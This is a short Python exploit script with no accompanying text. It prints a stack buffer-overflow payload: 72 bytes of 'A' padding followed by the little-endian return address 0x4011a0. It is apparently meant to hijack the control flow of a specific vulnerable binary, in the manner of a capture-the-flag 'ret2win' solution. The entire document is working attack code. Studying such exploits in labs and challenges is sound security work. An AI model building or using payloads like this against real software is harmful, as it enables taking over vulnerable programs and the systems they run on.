#!/usr/bin/env python3

import sys

payload = b"A" * 72 + b"\xa0\x11\x40\x00\x00\x00\x00\x00"

if __name__ == '__main__':
    sys.stdout.buffer.write(payload)